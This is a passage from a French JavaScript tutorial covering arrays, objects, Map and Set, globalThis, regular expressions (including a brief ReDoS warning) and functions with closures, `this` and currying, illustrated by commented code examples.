copieSup[0].push(99);                  // modifie AUSSI matrice[0] : sous-tableaux partagés
console.log(matrice);                  // [[1, 99], [2]]
const copieProf = structuredClone(matrice);   // copie profonde
console.log(copieProf !== matrice);
```

### 8.6 Tableaux d'objets : schémas courants

```javascript
const users = [{ id: 1, nom: 'Alice', actif: true }, { id: 2, nom: 'Bob', actif: false }];

console.log(users.map(u => u.nom));                           // ['Alice', 'Bob']
console.log(users.find(u => u.id === 2));                     // { id: 2, ... }
console.log(users.filter(u => u.actif).length);               // 1
console.log(users.toSorted((x, y) => x.nom.localeCompare(y.nom)));

// Index par identifiant pour des recherches rapides
const parId = Object.fromEntries(users.map(u => [u.id, u]));
console.log(parId[1].nom);                                    // 'Alice'

// Mise à jour immuable d'un élément
const misAJour = users.map(u => (u.id === 2 ? { ...u, actif: true } : u));
console.log(misAJour[1].actif, users[1].actif);               // true false : l'original est intact
```

### 8.7 Tableaux typés et structures voisines

Pour des données **numériques homogènes** de grande taille (audio, images, calcul), les **tableaux typés** (`Uint8Array`, `Int32Array`, `Float64Array`, `Float16Array` récent…) sont adossés à un `ArrayBuffer` : taille fixe, un seul type, performances prévisibles. Ils partagent beaucoup de méthodes avec `Array` (`map`, `filter`, `slice`, `toSorted`…).

```javascript
const octets = new Uint8Array([10, 255, 256, -1]);
console.log(octets);   // Uint8Array [10, 255, 0, 255] : valeurs ramenées modulo 256
```

### 8.8 Bonnes pratiques et pièges

- Préférez les méthodes **non mutantes** et le **spread** pour éviter les effets de bord.
- Testez un tableau avec `Array.isArray()`, jamais avec `typeof`.
- Comparer deux tableaux avec `===` compare les **références** : `[1] === [1]` est faux ; comparez élément par élément ou via `JSON.stringify` pour des cas simples.
- Pour tester souvent l'appartenance dans de grandes collections, utilisez un **`Set`** (accès en temps quasi constant).
- `map` doit **renvoyer une valeur** ; pour des effets de bord, utilisez `forEach` ou `for...of`.
- Chaînez les méthodes avec modération : lisibilité d'abord.

### Points clés du module 8

- Un tableau est un objet ordonné, indexé à partir de 0, à longueur dynamique.
- `push`, `pop`, `splice`, `sort`, `reverse` **mutent** ; `slice`, `concat`, `toSorted`, `with` non.
- `map`, `filter`, `reduce`, `find`, `some`, `every`, `flat`, `flatMap` forment la boîte à outils fonctionnelle.
- `sort()` sans comparateur trie en ordre alphabétique : fournissez `(a, b) => a - b` pour les nombres.

## 9. Objets, `Map` et `Set`

### 9.1 Les objets

Un **objet** est une collection de **propriétés**, chacune associant une **clé** (chaîne ou symbole) à une **valeur** (de n'importe quel type, y compris une fonction : on parle alors de **méthode**). C'est la structure fondamentale du langage : presque tout, hors primitives, est un objet.

```javascript
const personne = {
    nom: 'Alice',
    age: 30,
    'code postal': '75001',                 // clé avec espace : guillemets obligatoires
    saluer() { return `Bonjour, je suis ${this.nom}`; },   // méthode
};

console.log(personne.nom);                  // 'Alice' (notation pointée)
console.log(personne['code postal']);       // '75001' (notation crochets : clés dynamiques ou atypiques)
personne.ville = 'Paris';                   // ajout
personne.age = 31;                          // modification
delete personne.age;                        // suppression
console.log('nom' in personne);             // true : propriété présente (propre ou héritée)
console.log(Object.hasOwn(personne, 'nom'));   // true : propriété PROPRE (remplace hasOwnProperty)
console.log(personne.inexistante);          // undefined : pas d'erreur
console.log(personne.saluer());             // 'Bonjour, je suis Alice'
```

#### Créer des objets

| Manière | Exemple | Remarque |
| --- | --- | --- |
| Littéral | `{ a: 1 }` | La plus courante |
| Constructeur de classe / fonction | `new Personne('A')` | Modules 18 et 19 |
| `Object.create(proto)` | `Object.create(null)` | Choisit le prototype |
| Fabrique | `creerPersonne('A')` | Fonction qui renvoie un objet |

#### Propriétés calculées, raccourcis, accesseurs

```javascript
const cle = 'couleur';
const nom = 'Alice', age = 30;
const o = {
    [cle]: 'rouge',          // nom de propriété calculé
    nom, age,                // raccourci : { nom: nom, age: age }
    get description() { return `${this.nom}, ${this.age} ans`; },   // accesseur : propriété calculée à la lecture
    set anniversaire(valeur) { this.age = valeur; },
};
console.log(o.couleur, o.description);   // 'rouge' 'Alice, 30 ans'
o.anniversaire = 31;
console.log(o.age);                      // 31
```

#### Ordre des propriétés

Le parcours énumère d'abord les clés **entières** par ordre croissant, puis les clés chaînes dans l'ordre de **création**, puis les symboles. D'où `{ b: 1, 2: 'x', a: 1, 1: 'y' }` énumérée dans l'ordre `1, 2, b, a`.

#### Descripteurs et contrôle de la mutabilité

Chaque propriété possède des **attributs** : `value`, `writable` (modifiable), `enumerable` (visible dans les boucles et `Object.keys`), `configurable` (supprimable, redéfinissable).

```javascript
const o = {};
Object.defineProperty(o, 'id', { value: 7, writable: false, enumerable: true, configurable: false });
o.id = 99;                                  // ignoré (erreur en mode strict)
console.log(o.id);                          // 7
console.log(Object.getOwnPropertyDescriptor(o, 'id'));

const fige = Object.freeze({ a: 1, interne: { b: 2 } });   // aucune modification, ajout ni suppression
fige.a = 2;                                 // ignoré
fige.interne.b = 3;                         // AUTORISÉ : freeze est superficiel
console.log(fige, Object.isFrozen(fige));   // { a: 1, interne: { b: 3 } } true

const scelle = Object.seal({ x: 1 });       // valeurs modifiables, mais pas d'ajout ni de suppression
scelle.x = 5; scelle.y = 6;
console.log(scelle);                        // { x: 5 }
// Object.preventExtensions(o) : interdit seulement l'ajout
```

#### Méthodes utilitaires de `Object`

| Méthode | Rôle |
| --- | --- |
| `Object.keys(o)` / `values(o)` / `entries(o)` | Tableaux des clés / valeurs / paires `[clé, valeur]` (propriétés propres énumérables) |
| `Object.fromEntries(paires)` | Reconstruit un objet depuis des paires |
| `Object.assign(cible, ...sources)` | Copie des propriétés **dans la cible** (la mute) |
| `Object.freeze()` / `seal()` / `preventExtensions()` | Restreignent les modifications |
| `Object.getOwnPropertyNames(o)` / `getOwnPropertySymbols(o)` | Toutes les clés propres (énumérables ou non) |
| `Object.defineProperty()` / `defineProperties()` | Définit avec attributs |
| `Object.getPrototypeOf()` / `setPrototypeOf()` | Prototype |
| `Object.groupBy(it, fn)` | Regroupe *(ES2024)* |
| `structuredClone(o)` | Copie profonde |

```javascript
const prix = { pomme: 1, poire: 2 };
console.log(Object.entries({ a: 1, b: 2 }));     // [['a', 1], ['b', 2]]
console.log(Object.fromEntries(Object.entries(prix).map(([k, v]) => [k, v * 1.2])));   // transforme les valeurs

const defauts = { theme: 'clair', langue: 'fr' };
const options = { langue: 'en' };
console.log({ ...defauts, ...options });          // fusion : la dernière valeur gagne

const { nom, ...reste } = { nom: 'Alice', age: 30, ville: 'Paris' };   // reste : copie sans la clé extraite
console.log(nom, reste);
```

#### Pièges des objets utilisés comme dictionnaires

- Les clés sont des **chaînes ou symboles** : `o[1]` et `o['1']` désignent la même propriété.
- Un objet littéral **hérite** de `Object.prototype` : `'toString' in {}` est vrai, `{}.constructor` existe. Pour un dictionnaire pur, créez `Object.create(null)` ou utilisez une `Map`.
- Avec des clés provenant de données externes, `__proto__` peut provoquer une **pollution de prototype** (attaque modifiant `Object.prototype` pour toute l'application) : filtrez-la, ou utilisez une `Map`.
- Deux objets ne sont **jamais égaux** par `===` s'ils sont distincts, même de contenu identique.

### 9.2 `Map` : un véritable dictionnaire

Une **`Map`** associe clés et valeurs, accepte **n'importe quel type de clé** (objets, fonctions, `NaN`), **préserve l'ordre d'insertion** et expose sa taille via `size`.

```javascript
const scores = new Map();
scores.set('Alice', 15).set('Bob', 12);          // set est chaînable
console.log(scores.get('Alice'));                // 15
console.log(scores.get('Zoé'));                  // undefined
console.log(scores.has('Bob'));                  // true
scores.delete('Bob');
console.log(scores.size);                        // 1

scores.set('Chloé', 18);
for (const [nom, note] of scores) console.log(nom, note);   // itération directe, dans l'ordre d'insertion
console.log([...scores.keys()], [...scores.values()]);
scores.forEach((note, nom) => console.log(nom, note));      // attention : (valeur, clé)

const cleObjet = { id: 1 };
const meta = new Map([[cleObjet, 'données associées']]);     // constructeur : itérable de paires
console.log(meta.get(cleObjet));

const versObjet = Object.fromEntries(scores);               // conversions
const depuisObjet = new Map(Object.entries({ a: 1 }));
console.log(versObjet, depuisObjet);

// ES2026 : getOrInsert évite le motif « si absent, créer puis utiliser »
const groupes = new Map();
groupes.getOrInsert('fruits', []).push('pomme');
groupes.getOrInsertComputed('legumes', () => []).push('carotte');   // valeur calculée seulement si absente
console.log(groupes);
```

**`Map` ou objet ?**

| Critère | Objet | `Map` |
| --- | --- | --- |
| Types de clés | Chaîne / symbole | **Tous** |
| Ordre | Entiers d'abord, puis insertion | **Ordre d'insertion** |
| Taille | `Object.keys(o).length` | `map.size` |
| Itération | Via `Object.entries` | Directe |
| Clés hérités du prototype | Oui (risque de collision) | Non |
| Ajouts / suppressions fréquents | Moins performant | **Mieux optimisé** |
| Sérialisation JSON | Native | À convertir (`[...map]`) |
| Usage conseillé | Enregistrement à clés connues | Dictionnaire dynamique |

### 9.3 `Set` : une collection de valeurs uniques

Un **`Set`** ne contient chaque valeur qu'une fois (comparaison *SameValueZero*), conserve l'ordre d'insertion et teste l'appartenance en temps quasi constant.

```javascript
const unique = new Set([1, 2, 2, 3]);    // Set {1, 2, 3}
unique.add(4).add(4);                    // le doublon est ignoré
console.log(unique.has(2));              // true
unique.delete(1);
console.log(unique.size, unique);        // 3 Set {2, 3, 4}

const sansDoublons = [...new Set([1, 2, 2, 3, 3, 3])];   // dédoublonnage idiomatique
console.log(sansDoublons);               // [1, 2, 3]
console.log(new Set([NaN, NaN]).size);   // 1 : NaN est considéré égal à NaN
console.log(new Set([{}, {}]).size);     // 2 : deux objets distincts
```

#### Opérations ensemblistes (ES2025)

```javascript
const a = new Set([1, 2, 3]);
const b = new Set([3, 4]);

console.log(a.union(b));                 // Set {1, 2, 3, 4}
console.log(a.intersection(b));          // Set {3}
console.log(a.difference(b));            // Set {1, 2}
console.log(a.symmetricDifference(b));   // Set {1, 2, 4}
console.log(a.isSubsetOf(b), a.isSupersetOf(b), a.isDisjointFrom(b));   // false false false
```

Ces méthodes renvoient de **nouveaux** ensembles et acceptent tout objet « set-like » (ayant `size`, `has` et `keys`).

### 9.4 `WeakMap`, `WeakSet` et `WeakRef`

Les clés d'une **`WeakMap`** (ou les éléments d'un **`WeakSet`**) doivent être des **objets**, retenus **faiblement** : si plus rien d'autre ne référence l'objet, le **ramasse-miettes** peut le collecter et l'entrée disparaît. Elles ne sont **ni itérables ni dotées de `size`**. Usages : associer des métadonnées ou un cache à des objets (par exemple des éléments du DOM) **sans fuite de mémoire**, données privées.

```javascript
const element = { id: 'carte-1' };
const meta = new WeakMap();
meta.set(element, { clics: 0 });
meta.get(element).clics++;
console.log(meta.get(element), meta.has(element));   // { clics: 1 } true
// Quand `element` n'est plus référencé ailleurs, l'entrée peut être ramassée.
```

`WeakRef` et `FinalizationRegistry` offrent un contrôle plus fin sur les références faibles ; ils sont réservés à des cas avancés, car le moment de la collecte est imprévisible.

### 9.5 Choisir la bonne structure

| Besoin | Structure |
| --- | --- |
| Liste ordonnée, accès par position | `Array` |
| Enregistrement à clés connues (utilisateur, config) | Objet |
| Dictionnaire dynamique, clés quelconques | `Map` |
| Valeurs uniques, tests d'appartenance rapides | `Set` |
| Cache ou métadonnées liés à des objets | `WeakMap` |
| Numérique homogène volumineux | Tableau typé |

### Points clés du module 9

- Un objet est un ensemble de paires clé → valeur ; `const` ne le rend pas immuable, `Object.freeze` le fige superficiellement.
- `in` teste les clés héritées, `Object.hasOwn` les clés propres.
- `Map` : clés de tout type, ordre garanti, `size`. `Set` : valeurs uniques, opérations ensemblistes.
- `WeakMap` et `WeakSet` évitent les fuites mémoire en retenant leurs clés faiblement.

## 10. `globalThis`

### 10.1 L'objet global et ses noms

L'**objet global** contient les identifiants disponibles partout (`console`, `setTimeout`, `Math`, `Array`…). Son nom variait selon l'environnement, ce qui compliquait le code partagé :

| Environnement | Nom historique |
| --- | --- |
| Fenêtre de navigateur | `window` (aussi `self`, `frames`) |
| Web Worker, Service Worker | `self` |
| Node.js | `global` |

**`globalThis`** (ES2020) est le **même nom partout** : il renvoie toujours l'objet global de l'environnement courant.

```javascript
console.log(globalThis.setTimeout === setTimeout);     // true
console.log(globalThis.console === console);           // true
globalThis.maVariable = 42;                             // crée une globale : à éviter
console.log(maVariable, globalThis.maVariable);         // 42 42
delete globalThis.maVariable;
```

### 10.2 Cas d'usage légitimes

```javascript
// Détection de fonctionnalités (feature detection) : tester la présence plutôt que le navigateur
if (typeof globalThis.fetch === 'function') console.log('fetch est disponible');
if ('structuredClone' in globalThis) console.log('structuredClone est disponible');

// Polyfill : fournir une API absente
if (!globalThis.structuredClone) {
    globalThis.structuredClone = (v) => JSON.parse(JSON.stringify(v));   // version approximative
}

// Code isomorphe : même fichier pour navigateur et Node
const estNavigateur = typeof globalThis.document !== 'undefined';
console.log(estNavigateur ? 'navigateur' : 'serveur');
```

On teste l'existence avec `typeof` (qui ne lève pas d'erreur pour un nom inconnu) ou avec l'opérateur `in`, et non en lisant directement un identifiant potentiellement absent.

### 10.3 Variables globales : règles précises

- Dans un **script classique**, `var` et les **déclarations de fonction** de niveau supérieur deviennent des **propriétés** de `globalThis` ; `let`, `const` et `class` créent une liaison globale **sans** propriété sur `globalThis`.
- Dans un **module ES**, le niveau supérieur a sa **propre portée** : rien n'est global sans affectation explicite à `globalThis`.
- Dans un **module** ou en CommonJS, `this` au niveau supérieur **n'est pas** `globalThis` (il vaut `undefined` dans un module ; dans un fichier CommonJS de Node, c'est `module.exports`).
- Dans une fonction non stricte appelée simplement, `this` vaut `globalThis` ; en **mode strict**, il vaut `undefined`.

### 10.4 Pièges et bonnes pratiques

- Les globales créent des **collisions** de noms entre scripts, des dépendances implicites et des tests difficiles : isolez le code dans des **modules**.
- Une affectation à un nom non déclaré (`x = 5`) crée une globale accidentelle en mode non strict : activez le mode strict.
- Ne modifiez pas les objets natifs (`Array.prototype.maMethode = ...`) : risque de conflits avec de futures normes. Un polyfill ne doit s'activer que si la fonctionnalité est absente.
- Ne stockez pas de secrets ni d'état applicatif dans des globales accessibles depuis la console.

### Points clés du module 10

- `globalThis` est le nom unique et standard de l'objet global.
- Utilisez-le pour la détection de fonctionnalités et les polyfills, pas pour stocker des variables.
- `var` global devient propriété de `globalThis` ; `let` / `const` et les modules n'y touchent pas.

## 11. Expressions régulières

### 11.1 Qu'est-ce qu'une expression régulière ?

Une **expression régulière** (*regex*, `RegExp`) est un **motif** décrivant un ensemble de chaînes. On s'en sert pour **tester**, **extraire**, **remplacer** et **découper** du texte.

```javascript
const re1 = /ab+c/i;                       // littéral : le plus courant, motif fixe
const re2 = new RegExp('ab+c', 'i');       // constructeur : motif construit dynamiquement
console.log(re1.test('xABBCx'), re2.test('abc'));   // true true

const saisie = 'a.b*c';
const sur = new RegExp(RegExp.escape(saisie));      // RegExp.escape (ES2025) neutralise les caractères spéciaux
console.log(sur.test('a.b*c'), sur.test('aXbbc'));  // true false
```

Avec le constructeur, les antislashs doivent être **doublés** dans la chaîne : `new RegExp('\\d+')` équivaut à `/\d+/`.

### 11.2 Syntaxe : les briques

#### Caractères et classes

| Motif | Signification |
| --- | --- |
| `abc` | Les caractères littéraux `abc` |
| `.` | N'importe quel caractère sauf le saut de ligne (avec `s` : tous) |
| `\d` / `\D` | Chiffre `[0-9]` / non-chiffre |
| `\w` / `\W` | Caractère de mot `[A-Za-z0-9_]` / contraire (n'inclut **pas** les lettres accentuées) |
| `\s` / `\S` | Espace blanc (espace, tabulation, saut de ligne…) / contraire |
| `[abc]` / `[^abc]` / `[a-z]` | Un caractère parmi / hors de / dans une plage |
| `\.` `\*` `\(` `\\` | Caractères spéciaux échappés |
| `\p{L}` / `\p{Lu}` / `\p{Emoji}` | Propriétés Unicode (avec les flags `u` ou `v`) : lettre, majuscule, emoji |

#### Ancres et frontières

| Motif | Signification |
| --- | --- |
| `^` / `$` | Début / fin de la chaîne (de **chaque ligne** avec le flag `m`) |
| `\b` / `\B` | Frontière / non-frontière de mot |

#### Quantificateurs

| Motif | Signification |
| --- | --- |
| `*` / `+` / `?` | 0 ou plus / 1 ou plus / 0 ou 1 |
| `{n}` / `{n,}` / `{n,m}` | Exactement `n` / au moins `n` / entre `n` et `m` |
| `*?` `+?` `??` `{n,m}?` | Versions **paresseuses** : le moins de caractères possible |

Par défaut, les quantificateurs sont **gourmands** (*greedy*) : ils prennent le plus possible. Comparez :

```javascript
const html = '<b>gras</b> et <i>italique</i>';
console.log(html.match(/<.+>/)[0]);     // '<b>gras</b> et <i>italique</i>' : gourmand
console.log(html.match(/<.+?>/)[0]);    // '<b>' : paresseux
```

#### Groupes, alternatives, références

| Motif | Signification |
| --- | --- |
| `(a\|b)` | Groupe **capturant** avec alternative |
| `(?:…)` | Groupe **non capturant** |
| `(?<nom>…)` | Groupe **nommé** |
| `\1` / `\k<nom>` | **Référence arrière** à un groupe |
| `(?=…)` / `(?!…)` | Anticipation (*lookahead*) positive / négative |
| `(?<=…)` / `(?<!…)` | Rétrospection (*lookbehind*) positive / négative |

Les **assertions** (`^`, `$`, `\b`, anticipations, rétrospections) testent une **position** sans consommer de caractères.

### 11.3 Drapeaux (*flags*)

| Flag | Effet |
| --- | --- |
| `g` | Global : toutes les correspondances (et mémorise `lastIndex`) |
| `i` | Insensible à la casse |
| `m` | Multiligne : `^` et `$` agissent sur chaque ligne |
| `s` | `.` correspond aussi au saut de ligne |
| `u` | Mode Unicode : points de code et propriétés `\p{…}` |
| `v` | Mode Unicode étendu : opérations sur classes (`[\p{L}--[a-z]]`), propriétés de chaînes (ES2024) |
| `y` | Collant (*sticky*) : la correspondance doit commencer exactement à `lastIndex` |
| `d` | Fournit les **indices** de début et de fin des groupes (ES2022) |

### 11.4 Méthodes

| Méthode | Rôle |
| --- | --- |
| `re.test(texte)` | Renvoie `true` / `false` |
| `re.exec(texte)` | Première correspondance avec détails, ou `null` ; avec `g`, avance d'appel en appel |
| `texte.match(re)` | Sans `g` : détails de la première ; avec `g` : tableau de toutes les correspondances |
| `texte.matchAll(re)` | **Itérateur** de toutes les correspondances détaillées (le flag `g` est obligatoire) |
| `texte.replace(re, rempl)` / `replaceAll` | Remplacement (chaîne avec `$1`, `$<nom>`, `$&`, ou fonction) |
| `texte.split(re)` | Découpe selon le motif |
| `texte.search(re)` | Position de la première correspondance (ou `-1`) |

```javascript
console.log(/\d+/.test('abc123'));          // true
console.log('a1b22c333'.match(/\d+/g));      // ['1', '22', '333']
console.log('a, b;c  d'.split(/[,;\s]+/));  // ['a', 'b', 'c', 'd']
console.log('Bonjour'.search(/j/));          // 3

for (const r of 'a1b22'.matchAll(/\d+/g)) console.log(r[0], r.index);   // '1' 1, puis '22' 3
```

**Piège du flag `g` avec `test` / `exec`** : l'objet regex garde en mémoire `lastIndex`, d'où des résultats alternés si vous réutilisez la même regex globale :

```javascript
const re = /a/g;
console.log(re.test('a'), re.test('a'), re.test('a'));   // true false true : lastIndex avance puis revient à 0
```

Solution : ne mettez pas `g` sur une regex servant à `test`, ou réinitialisez `re.lastIndex = 0`.

### 11.5 Groupes de capture et remplacement

```javascript
const m = '2026-10-11'.match(/(?<annee>\d{4})-(?<mois>\d{2})-(?<jour>\d{2})/);
console.log(m.groups.annee, m[1], m.index);   // '2026' '2026' 0
const { annee, mois, jour } = m.groups;       // décomposition des groupes nommés
console.log(`${jour}/${mois}/${annee}`);      // '11/10/2026'

console.log('Alice Dupont'.replace(/(\w+) (\w+)/, '$2 $1'));                       // 'Dupont Alice'
console.log('2026-10-11'.replace(/(?<a>\d+)-(?<m>\d+)-(?<j>\d+)/, '$<j>/$<m>/$<a>'));   // '11/10/2026'
console.log('prix: 5 et 12'.replace(/\d+/g, (n) => n * 2));                          // 'prix: 10 et 24'

console.log(/(\w)\1/.test('hello'));          // true : 'll' = lettre répétée (référence arrière)

const avecIndices = /(?<mot>\w+)/d.exec('  salut');
console.log(avecIndices.indices.groups.mot);  // [2, 7] : positions de début et de fin
```

### 11.6 Anticipations et rétrospections

```javascript
console.log('100€ 200$'.match(/\d+(?=€)/g));         // ['100'] : nombre suivi de € (sans consommer €)
console.log('100€ 200$'.match(/\d+(?!€)\b/g));        // ['200'] : nombre non suivi de €
console.log('prix: 100€'.match(/(?<=prix: )\d+/)[0]); // '100' : précédé de « prix: »
console.log('a1 b2'.replace(/(?<!a)\d/, '#'));        // 'a1 b#' : chiffre non précédé de « a »
```

### 11.7 Exemples utiles

```javascript
const email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;          // validation simple, volontairement non exhaustive
const telFr = /^(?:\+33|0)[1-9](?:[ .-]?\d{2}){4}$/;
const motDePasse = /^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$/;   // anticipations multiples : chiffre, minuscule, majuscule, 8+ caractères
const espaces = /\s+/g;

console.log(email.test('alice@exemple.fr'), email.test('alice@exemple'));   // true false
console.log(telFr.test('06 12 34 56 78'));                                    // true
console.log(motDePasse.test('Abcdef12'), motDePasse.test('abcdef12'));       // true false
console.log('a   b'.replace(espaces, ' '));                                   // 'a b'
console.log('Éléphant'.match(/\p{Lu}/gu));                                    // ['É'] : majuscules Unicode
```

### 11.8 Performance et sécurité : le ReDoS

Certains motifs imbriqués (`(a+)+$`) subissent un **retour arrière catastrophique** : sur une entrée adverse comme `'aaaaaaaaaaaaaaaaaaaaaaaa!'`, le temps de calcul explose de façon exponentielle et fige le programme. C'est une attaque de **déni de service par expression régulière (ReDoS)**. Évitez les quantificateurs imbriqués ambigus, bornez les longueurs d'entrée, et n'exécutez jamais une regex fournie par un utilisateur sur des données sensibles.

### 11.9 Bonnes pratiques

- Gardez les motifs **simples et commentés** ; construisez-les par morceaux nommés ; testez-les sur regex101.com.
- Pour valider un e-mail ou une URL, préférez la validation **native** (`<input type='email'>`, `URL.canParse()`) ou une bibliothèque.
- Échappez toute saisie utilisateur insérée dans un motif avec `RegExp.escape`.
- N'analysez pas de HTML ou de JSON avec des regex : utilisez un analyseur (`DOMParser`, `JSON.parse`).
- Utilisez `u` (ou `v`) dès que le texte peut contenir des caractères non ASCII.

### Points clés du module 11

- Une regex décrit un motif ; elle se crée par littéral ou `new RegExp`.
- Quantificateurs gourmands par défaut, paresseux avec `?`.
- Groupes nommés, références arrière, anticipations et rétrospections permettent des extractions précises.
- Attention à `lastIndex` avec `g` et au ReDoS.

## 12. Fonctions, portée et fermetures

### 12.1 Qu'est-ce qu'une fonction ?

Une **fonction** est un bloc de code nommé (ou anonyme), **réutilisable**, qui reçoit des **paramètres** (noms déclarés dans la définition), est appelée avec des **arguments** (valeurs réelles fournies à l'appel) et **renvoie** une valeur. En JavaScript, une fonction est un **objet** : une valeur de première classe qu'on affecte, passe en argument, renvoie, et à laquelle on peut attacher des propriétés.

#### Trois manières de la définir

```javascript
// 1. Déclaration : hoistée en entier (utilisable avant sa ligne)
function additionner(a, b) {
    return a + b;
}

// 2. Expression de fonction : non hoistée (suit la règle de la variable)
const soustraire = function (a, b) { return a - b; };

// 3. Fonction fléchée : syntaxe courte, this lexical
const multiplier = (a, b) => a * b;          // retour implicite d'une expression
const carre = x => x ** 2;                   // un paramètre : parenthèses facultatives
const creer = () => ({ nom: 'Alice' });      // retour d'objet : parenthèses obligatoires
const complexe = (a, b) => {                 // corps en bloc : return explicite
    const somme = a + b;
    return somme * 2;
};

console.log(additionner(2, 3), soustraire(5, 3), multiplier(4, 3), carre(5), creer(), complexe(1, 2));
```

|  | Fléchée `=>` | Classique `function` |
| --- | --- | --- |
| `this` | **Hérité** de la portée englobante (lexical) | Dépend de **l'appel** |
| `arguments` | Non (utilisez `...reste`) | Oui |
| Appelable avec `new` | Non | Oui |
| Propre `prototype` | Non | Oui |
| Méthode d'objet | À éviter (`this` non lié à l'objet) | Adaptée |
| Usage idéal | Callbacks, petites fonctions | Méthodes, constructeurs, fonctions nommées |

#### Autres formes

```javascript
const objet = {
    methode() { return 'méthode courte'; },
    async chargement() { return 1; },       // fonction asynchrone (module 16)
    *generateur() { yield 1; },             // générateur (module 13)
};
console.log(objet.methode());
console.log(additionner.name, additionner.length);   // 'additionner' 2 : nom et nombre de paramètres sans valeur par défaut
```

### 12.2 Paramètres et arguments

```javascript
function saluer(nom = 'inconnu', ...titres) {     // valeur par défaut + paramètre rest
    return `Bonjour ${titres.join(' ')} ${nom}`.replace('  ', ' ');
}
console.log(saluer());                       // 'Bonjour inconnu'
console.log(saluer('Alice', 'Dr', 'Pr'));    // 'Bonjour Dr Pr Alice'

const nombres = [1, 2, 3];
console.log(Math.max(...nombres));           // 3 : spread à l'appel

function config({ port = 3000, hote = 'localhost' } = {}) {   // paramètres nommés par décomposition
    return `${hote}:${port}`;
}
console.log(config());                       // 'localhost:3000'
console.log(config({ port: 8080 }));         // 'localhost:8080'
```

- Un argument **manquant** vaut `undefined` ; les arguments **en trop** sont ignorés (mais accessibles via `arguments` ou `...reste`).
- La **valeur par défaut** s'évalue **à chaque appel**, uniquement si l'argument vaut `undefined` (pas `null`), et peut dépendre des paramètres précédents : `function f(a, b = a * 2) {}`.
- Le paramètre **rest** (`...reste`) doit être le **dernier** et est un vrai tableau.
- Les arguments de type primitif sont passés **par valeur** ; les objets par **référence partagée** : modifier le contenu d'un objet reçu modifie l'original, réaffecter le paramètre ne change rien à l'extérieur.

```javascript
function modifier(obj, nombre) {
    obj.touche = true;      // visible à l'extérieur
    nombre = 99;            // sans effet à l'extérieur
    obj = { autre: 1 };     // réaffecte seulement le paramètre local
}
const o = {}; let n = 1;
modifier(o, n);
console.log(o, n);          // { touche: true } 1
```

### 12.3 Valeur de retour

Une fonction sans `return` (ou avec `return;`) renvoie `undefined`. `return` met fin immédiatement à la fonction. Pour renvoyer plusieurs valeurs, renvoyez un **tableau** ou, mieux, un **objet** (lisible à la décomposition).

```javascript
const minMax = (t) => ({ min: Math.min(...t), max: Math.max(...t) });
const { min, max } = minMax([3, 1, 4]);
console.log(min, max);   // 1 4
```

### 12.4 Portée lexicale

Une fonction a accès aux variables de la portée où elle est **écrite** (et de toutes les portées englobantes), **pas** de celle d'où elle est appelée. C'est la **portée lexicale** (ou statique).

```javascript
const global = 'G';
function externe() {
    const local = 'L';
    function interne() { return `${global}${local}`; }   // voit local ET global
    return interne();
}
console.log(externe());   // 'GL'
```

### 12.5 Fermetures (*closures*)

Une **fermeture** est une fonction qui **conserve un accès aux variables de la portée dans laquelle elle a été créée**, même après la fin de l'exécution de cette portée. Les variables capturées sont **gardées vivantes** (le ramasse-miettes ne les libère pas) tant que la fonction existe, et elles sont **partagées** par référence, pas copiées.

```javascript
function creerCompteur() {
    let compte = 0;                    // variable « privée », captée par les deux fonctions
    return {
        incrementer: () => ++compte,
        valeur: () => compte,
    };
}
const c = creerCompteur();
c.incrementer();
c.incrementer();
console.log(c.valeur());               // 2
console.log(c.compte);                 // undefined : inaccessible de l'extérieur

const autre = creerCompteur();         // chaque appel crée un état INDÉPENDANT
console.log(autre.valeur());           // 0
```

Usages : **données privées**, **fabriques de fonctions**, **mémoïsation**, **callbacks** conservant du contexte, application partielle, `debounce` / `throttle`.

```javascript
// Fabrique de fonctions
const multiplierPar = (facteur) => (x) => x * facteur;
const double = multiplierPar(2);
console.log(double(21));               // 42

// debounce : n'exécute qu'après un temps de silence (recherche en direct)
function debounce(fn, delai) {
    let minuteur;                       // capturée par la fermeture
    return (...args) => {
        clearTimeout(minuteur);
        minuteur = setTimeout(() => fn(...args), delai);
    };
}
const recherche = debounce((q) => console.log('Recherche :', q), 200);
recherche('a'); recherche('ab'); recherche('abc');   // une seule exécution : 'abc'
```

#### Le piège classique des boucles

```javascript
for (var i = 0; i < 3; i++) setTimeout(() => console.log('var :', i));   // 3 3 3 : une seule variable i partagée
for (let j = 0; j < 3; j++) setTimeout(() => console.log('let :', j));   // 0 1 2 : une variable par itération
```

**Attention aux fuites mémoire** : une fermeture qui capture un gros objet l'empêche d'être libéré. Retirez les écouteurs et références devenus inutiles.

### 12.6 `this`, `call`, `apply`, `bind`

Le mot-clé **`this`** désigne l'objet « courant ». Sa valeur est déterminée **au moment de l'appel** (sauf pour les fonctions fléchées, qui l'héritent lexicalement).

| Façon d'appeler | Valeur de `this` |
| --- | --- |
| `objet.methode()` | `objet` |
| `fonction()` | `undefined` (mode strict) ou `globalThis` (mode sloppy) |
| `new Fonction()` | La nouvelle instance |
| `f.call(x)` / `f.apply(x)` / `f.bind(x)()` | `x` |
| Fonction fléchée | Celui de la portée englobante |
| Écouteur d'événement (fonction classique) | L'élément qui porte l'écouteur (`currentTarget`) |

```javascript
function presenter(salutation, ponctuation) {
    return `${salutation}, ${this.nom}${ponctuation}`;
}
const alice = { nom: 'Alice' };

console.log(presenter.call(alice, 'Salut', '!'));      // appel immédiat, arguments séparés
console.log(presenter.apply(alice, ['Salut', '!']));   // appel immédiat, arguments en tableau
const lie = presenter.bind(alice, 'Salut');            // renvoie une NOUVELLE fonction liée (application partielle)
console.log(lie('?'));                                 // 'Salut, Alice?'
```

**Perte de `this`** : une méthode extraite de son objet ne garde pas son contexte.

```javascript
const compteur = {
    n: 0,
    incrementer() { this.n++; return this.n; },
    incrementerDifferee() { setTimeout(() => console.log('flèche :', ++this.n), 0); },   // la flèche conserve this
};
const extraite = compteur.incrementer;
try { extraite(); } catch (e) { console.error(e.name); }     // TypeError : this est undefined (module/strict) ou globalThis
const liee = compteur.incrementer.bind(compteur);
console.log(liee());                                         // 1
compteur.incrementerDifferee();
```

### 12.7 Fonctions d'ordre supérieur, curryfication et composition

Une **fonction d'ordre supérieur** reçoit ou renvoie une fonction. La **curryfication** transforme `f(a, b)` en `f(a)(b)`. La **composition** enchaîne des fonctions.

```javascript
const appliquerDeuxFois = (f, x) => f(f(x));
console.log(appliquerDeuxFois(x => x * 2, 3));   // 12

const ajouter = n => x => x + n;                 // curryfication
console.log(ajouter(2)(3));                      // 5

